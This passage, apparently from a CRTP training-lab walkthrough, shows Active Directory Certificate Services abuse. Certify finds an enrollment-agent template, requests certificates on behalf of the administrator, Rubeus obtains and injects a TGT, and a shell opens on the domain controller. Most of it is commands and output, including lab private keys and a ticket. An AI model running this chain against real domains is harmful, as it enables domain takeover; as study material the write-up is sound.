- Find certificate templates vulnerable to ESC1 (`EKU`).
```
PS C:\AD\MyTools> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'

[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'

    Enterprise CA Name            : moneycorp-MCORP-DC-CA
    DNS Hostname                  : mcorp-dc.moneycorp.local
    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
    Cert Start Date               : 11/26/2022 1:59:16 AM
    Cert End Date                 : 11/26/2032 2:09:15 AM
    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
    Template Name                         : SmartCardEnrollment-Agent
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Certificate Request Agent
    mspki-certificate-application-policy  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519



Certify completed in 00:00:15.8795307
```

- The `SmartCardEnrollment-Agent` template has `EKU` for Certificate Request Agent and grants enrollment rights to Domain users.
- The `SmartCardEnrollment-Users` template has an `EKU` that allows for domain authentication and has application policy requirement of certificate request agent, so we can request a certificate on behalf of any user.
```
PS C:\AD\MyTools> .\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student303
[*] No subject name specified, using current context as subject.

[*] Template                : SmartCardEnrollment-Agent
[*] Subject                 : CN=student303, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 24

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAoAYBDp4Srj9W8uCcpa5blHqatLscMBnxr7H2Cqcwizw4eOIo
1GsewbsIFGN4NmrLDuMMCuVhtsk2Rp755qpPsu1n1yo0vIeofyWQFfU8jSwOXeJn
pNOXKYZom8BbFV8pa0zhsfx6VlzeNBAcUr5MuWDYYF97QpTLwDynEUnZOqlTcWU4
I/CVSke/3xktwg/MrqY3slUBgUr9QzMbUMNF0zwl9zEs084gbE+h7rCrSkWIhZHq
3ZKVbTq9noICPEWu9wlHKAoBOcww61OXNOfp8Zctj/vK8Sf6BUAgiQyCs02iKSKQ
1dE7OIKmjNEGKinrVxUlF1Lq0GkfIOauAlLQYQIDAQABAoIBABD1Me17oN0oRy2L
0e3Y0UmlyHk4jt8mEK+eu0UbvJA0vINK7Cq+g07iZBPNCrMxk/0q4F7TOgylvAO1
2yOvjqyWbfemOFp2QcvfjipVh6oqLgeS84rLBWzYGoPO2ZglMn11c0FqUQiP5Ng9
kNLP6c+HTMbBt40xuXnQs5+oZMXLeugqe0Xc31j/jjDSUrstpOxAiSIj4T1iDFmu
nfq2C/6dpMRg5Cada9iwjIpjXhG5BdQwb9/z55XSaJMJgk4Bd53ZcVlv0HJyFshE
Um/6k4Oj5E5YQ5XyWbhPAg9scghjXu5CHYdBpdtfDLLEOOkgNakXxDqGi2x5yuJk
n4ESYhUCgYEA0eSm0yjZQ+p4ZNFLNxOgaawXFu/qa+IeGjGpO6pQhdD8VxQ1qyWz
tJxiM7kIJ4oGGu68SXeilvf2zBuNz3BVn+m0OWP+OgisYu1QNk2cFYgXVT43Yfxt
cEpvRj4hFiJ9cGkjMMPAhfbgSAahK4OBDdHdxwOEiZhupOrvynAOL0MCgYEAwyzt
cyjd/b3FulzaQTuZXiXtxd89v1a7lgCCjP7gfwkCFrDwD2RlmcYbm+H8sD0qnjzr
q8dVHvFXBdeoU2ZR+cWGVGVhe/xbN11n32ZIMv1Vh85fmPpoWaN+KOa/39YY32EU
Iss2Oni1RsFs8dxTK9bGJ8UwncfW0ckrMtV4TYsCgYBO3MqRrFd13TM/LiREnWs4
SSCjzaEWx+7niKE9edCnds5ZKY7Ar3nF8rwzEuKteH6yv+Ce+gRtFN318qRlvJ9v
ZjABIED1LS0YPnJU9PQgYvHhZW8Jsf6soksM6WslFfBrvBUszWAY9Zlvdo43+0ES
IDhj/j5eNJfd/yf5uACcYQKBgB/WvWmS2hvhkFblfMk1csB0CYTE9Sq4eGNw89sS
XQb8LjYLaS3pn9VlBu34AKOzZrdnkr50BwPENQED/DaWs3q+aTptS2jRcwPmHeLI
qbB/uSstVFT9THaLADKl6dkW8PnHuWQvqEoDlPbU6PPPkFXPdIXaWiLzDa0tVvm0
7yofAoGAHZUIvOzxff7zXcT5aOQkg1XTKXfJWAGaTRiC9paYyCaUIeDF1UiuL77H
pQXb/BzIIfcJA7ujeLdkhBsJU6ekQVl6zJY3c7XPg3XpfnRY1dGM8BaU142wv/E7
y5QDiODiL/c+HzpKLWsOo13pphMBNAbAGhg0oEeUqedEVedlmqk=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGVzCCBT+gAwIBAgITFQAAABi9GprQJ5b/UAAAAAAAGDANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yMzA4MDkw
NzQwNTdaFw0yNTA4MDkwNzUwNTdaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50MzAzMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoAYBDp4Srj9W8uCcpa5blHqatLsc
MBnxr7H2Cqcwizw4eOIo1GsewbsIFGN4NmrLDuMMCuVhtsk2Rp755qpPsu1n1yo0
vIeofyWQFfU8jSwOXeJnpNOXKYZom8BbFV8pa0zhsfx6VlzeNBAcUr5MuWDYYF97
QpTLwDynEUnZOqlTcWU4I/CVSke/3xktwg/MrqY3slUBgUr9QzMbUMNF0zwl9zEs
084gbE+h7rCrSkWIhZHq3ZKVbTq9noICPEWu9wlHKAoBOcww61OXNOfp8Zctj/vK
8Sf6BUAgiQyCs02iKSKQ1dE7OIKmjNEGKinrVxUlF1Lq0GkfIOauAlLQYQIDAQAB
o4IDAzCCAv8wPAYJKwYBBAGCNxUHBC8wLQYlKwYBBAGCNxUIheGocofMn2jhhyaC
n65RgvL2fYE/guHdfLntDQIBZAIBBTAVBgNVHSUEDjAMBgorBgEEAYI3FAIBMA4G
A1UdDwEB/wQEAwIHgDAdBgkrBgEEAYI3FQoEEDAOMAwGCisGAQQBgjcUAgEwHQYD
VR0OBBYEFD3ftb+e/r773ItQgJf1AVUMkjQFMB8GA1UdIwQYMBaAFNH+jQqn+rQy
nzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NO
PW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1N
Q09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/
Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
b3JpdHkwQAYDVR0RBDkwN6A1BgorBgEEAYI3FAIDoCcMJXN0dWRlbnQzMDNAZG9s
bGFyY29ycC5tb25leWNvcnAubG9jYWwwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
AYI3GQIBoC8ELVMtMS01LTIxLTcxOTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2ODg2
NDgtNDEwMzANBgkqhkiG9w0BAQsFAAOCAQEAbB6IPXB86qE/4piD4PLGcpUXyWX5
Kfi8Mb0IUFiwV0Sfu66+LekctJh4NN7ZY5CHqlfgkMz7JD0v0avzPOQdQBUnQNnw
d3V51aw9oOaI67W3lsSbfGgU2FMzc3hYmmikNZQSwkTJ99+/0TSpDuryOL7bt51Z
qxNKgIVv/92IFY/hi4EcabH6mSkFW5lWZAucqL3bmfgEO+GLETPBNZFLc19LQ0KA
G9/J3iFL9vRiP0SZROL6qACkpjBuEGjCxlgan7MylF/T1nXcJAlbiqVGAdmHkR7Q
PDC3msRH3ob4B/0chqOKzPCWwSAQ2kiSaC/b+Qkpd2Y92v1h+55J6t8L8g==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

- Copy the whole `cert.pem` text, place it to a file `student.pem` and transfer it to a Linux machine.

- Run the following command to convert the certificate to a `.pfx` one (use a null password).
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
└─# openssl pkcs12 -in student.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out student.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

- Use the ``SmartCardEnrollment-Agent`` certificate to request a certificate for DA from the template `SmartCardEnrollment-Users`.
```
PS C:\AD\MyTools> .\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\MyTools\student.pfx

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : dcorp\student303

[*] Template                : SmartCardEnrollment-Users
[*] On Behalf Of            : dcorp\administrator

[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 25

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxBenX0vwBaArTGRSmXsTGjfMa/yAXNvjuSuxWmGyMpj+EMtP
4D6CehcEdzb2r802E15ohmaVx/dlYvLBedU5UJVSOXhwapjcJVi6P1a66F8gjaq8
jAjUuIACD5npO3GAUWT90w85iOHp+k4VxKlRlZA4YB98er7GGrAbD6pWUWXWYAIM
F5MbUyoK0T7BVkehdf0gGEGQbRLYAEFhQlc5MUbx9Q2bwVtvi5kaKG8aEWo/CJtS
b49wAHKbRn12ze9qlQJ+TUQpAtuiPJfABt7G2Eyo00amkbe7DshrFIw3EedlyYf+
U1ywDwCPSHC6tKlaxYPjnFyYm1ZEsBTdRgZwjQIDAQABAoIBAQCMqHL0lqILRwMH
/waI9ZGUQuYtp6fj9A77am4DaQTL6paEMXKQZgZt0Ujwwspc/JSHfDb6AWf7Umi1
e3BxFhPQy+t5Mf1hWVjAqU6f1HSp7mKJfClXQZZk6d2Ql1SHwTjMKecwmEErAPI3
C//tW48b+6GUwcEmwuWTizM+H29fXqyYn/y/QkxnnCh8FxNZUstTo6Jl67EBSaL3
8Yz0QB1A4WjoLNi5MuzUE8MOw/dDIh/5I2g0in8FRVrZY94MP9DR8aA3epR/cn/j
+xUXN83jqXLNXn6bU1cLEOra9MQgGXv+PPgO5yzBLPm0qryc7ytfm6GK4GdE1d0C
S8PP/bm5AoGBAMzc0OSgqYEqA/EpXHXUuXBpXbku6zstEWVj97y1dWoRm+OIhhJp
ne1w4nNGwGMXz8Gu4QmKp4+MqXI4Q2E261Z/PgDOpEPsz2CteJ2NQWojhxSZ/gb6
0RcEb5CypXZCmzzXvnXYCxwEBuWaXFt7Xrr9LscDPws1R7oFBDRYoYK/AoGBAPUK
Z4FSY2bD46x1UWwDsd4yY3H38++baa/axKp/gHGNFuc05eTRiiJBZWsbdItOSWMS
5N+Qj0oRBXyTr1qhFIpPt7xSDZTOY3orX7FE7bkWzA6KHKIxhmc7aaBHLRrl2wJ9
ItypSLyGH+iDi/DJrbu5szIEvlnHLeM/DUWnijuzAoGAWGwq4bOS1gRLhUjj9pvl
mmZwJKDiuTz/mDKo2FO+JRUKow/nRoU9vCGQLE9qdJrvelrAGP02y5fb/0fXlVs+
AqyTF4gZkJPjAoh9WguBI43IHRVGdr7FhtjMSrlA/6VKGd3JAFZKnUIDtBCHMpky
TyU+jnmROYY6uki2At4KgEMCgYEAz1oThiJSjOZcZVYNJUrnG3AmKI26NNqdDzsf
SmuEJBJQ/CsOEpehvST7jiv4bd08SoL1e50XM4S90NIkA5vlBrk4cDo61d3j3cCQ
RDBgvUvmNrN2UWV5JyfmVMOGDonMzwlXE8SIEUep/pY6N/JhekZEtaG/9baPRQnY
0EVauvMCgYBysyBe/FRj3N6sSIqstbDfMzg0JqlWFzL8pQKC7XGamjk3r1s3D9ok
sYEczD5jf5xStNvimZeEVKjiEylfeTN+atu6okTtDK1UARAEMYm5VopNi3LFYyQJ
LzmHu5YdN3zFb1BXhIl2aNTo9gXZGqiuit1MsRk+/qPACNEwafjPAw==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGiTCCBXGgAwIBAgITFQAAABmXmbsk0FCNIwAAAAAAGTANBgkqhkiG9w0BAQsF
ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yMzA4MDkw
NzQ3MjRaFw0yNTA4MDkwNzU3MjRaMHYxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRYwFAYDVQQDEw1BZG1pbmlzdHJhdG9yMIIB
IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxBenX0vwBaArTGRSmXsTGjfM
a/yAXNvjuSuxWmGyMpj+EMtP4D6CehcEdzb2r802E15ohmaVx/dlYvLBedU5UJVS
OXhwapjcJVi6P1a66F8gjaq8jAjUuIACD5npO3GAUWT90w85iOHp+k4VxKlRlZA4
YB98er7GGrAbD6pWUWXWYAIMF5MbUyoK0T7BVkehdf0gGEGQbRLYAEFhQlc5MUbx
9Q2bwVtvi5kaKG8aEWo/CJtSb49wAHKbRn12ze9qlQJ+TUQpAtuiPJfABt7G2Eyo
00amkbe7DshrFIw3EedlyYf+U1ywDwCPSHC6tKlaxYPjnFyYm1ZEsBTdRgZwjQID
AQABo4IDMjCCAy4wPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jh
hyaCn65RgvL2fYE/hrSlX4e6+hgCAWQCAQkwKQYDVR0lBCIwIAYIKwYBBQUHAwQG
CisGAQQBgjcKAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIHgDA1BgkrBgEEAYI3
FQoEKDAmMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwCgYIKwYBBQUHAwIwHQYD
VR0OBBYEFLKoCEtu8QMr4LRtr0A8na8zXvuCMB8GA1UdIwQYMBaAFNH+jQqn+rQy
nzb8ILj3y55oxUXtMIHYBgNVHR8EgdAwgc0wgcqggceggcSGgcFsZGFwOi8vL0NO
PW1vbmV5Y29ycC1NQ09SUC1EQy1DQSxDTj1tY29ycC1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1tb25leWNvcnAsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPW1vbmV5Y29ycC1N
Q09SUC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1tb25leWNvcnAsREM9bG9jYWw/
Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
b3JpdHkwQwYDVR0RBDwwOqA4BgorBgEEAYI3FAIDoCoMKGFkbWluaXN0cmF0b3JA
ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWwwTQYJKwYBBAGCNxkCBEAwPqA8Bgor
BgEEAYI3GQIBoC4ELFMtMS01LTIxLTcxOTgxNTgxOS0zNzI2MzY4OTQ4LTM5MTc2
ODg2NDgtNTAwMA0GCSqGSIb3DQEBCwUAA4IBAQBvyncZEwYsmSBzXyJwjZRxmaxs
52IfaH8uBJKZKjndWCWdrY80jw28UqHas1hvnER+acPXx2CENqbubQ8YUedY3FHO
emzeUqzYyhzmiOML8tMuFMjjx5sh6uP+HNsa4M5+TZXsCfABgxFsxMy/0ciJpToO
abIzbkAZAcujD1ByAkSg8GbMZpE9VLPAV7JmYsLRuFIGomGzPOdMue2qpUgC20+V
iFhawxYE2Bs0NZaPKo3w7blz5Q0fGjz/qZaXfoLZlsxQA5ySw0cw9M/1bdG6/5S2
r+v79Yf/t4JxtR7m8XcEwSjwlwC774am9bqFavVlEIE8ZvhrXCuayhUi5B31
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

- Copy the whole `cert.pem` text, place it to a file `Administrator.pem` and transfer it to a Linux machine.

- Run the following command to convert the certificate to a `.pfx` one (use a null password).
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/WindowsAttack]
└─# openssl pkcs12 -in Administrator.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out Administrator.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

- Use the `Administrator.pfx` certificate to request a TGT on behalf of `dcorp\administrator`.
```
PS C:\AD\MyTools> .\Rubeus.exe asktgt /user:Administrator /certificate:moneycorp.local\Administrator.pfx /dc:mcorp-dc.moneycorop.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=moneycorp, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'moneycorp.local\Administrator'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/moneycorp.local
  ServiceRealm             :  MONEYCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  MONEYCORP.LOCAL
  StartTime                :  8/9/2023 1:02:50 AM
  EndTime                  :  8/9/2023 11:02:50 AM
  RenewTill                :  8/16/2023 1:02:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  p0Y1QHpkXMt6k3zqZl6pOA==
  ASREP (key)              :  62163B177B0EAD1A3D2710F78EBE2D27

PS C:\AD\MyTools> klist

Current LogonId is 0:0x45724cc

Cached Tickets: (1)

#0>     Client: Administrator @ MONEYCORP.LOCAL
        Server: krbtgt/moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 8/9/2023 1:02:50 (local)
        End Time:   8/9/2023 11:02:50 (local)
        Renew Time: 8/16/2023 1:02:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\AD\MyTools> Enter-PSSession -ComputerName mcorp-dc.moneycorp.local
[mcorp-dc.moneycorp.local]: PS C:\Users\Administrator\Documents> hostname
mcorp-dc
[mcorp-dc.moneycorp.local]: PS C:\Users\Administrator\Documents> whoami
mcorp\administrator
```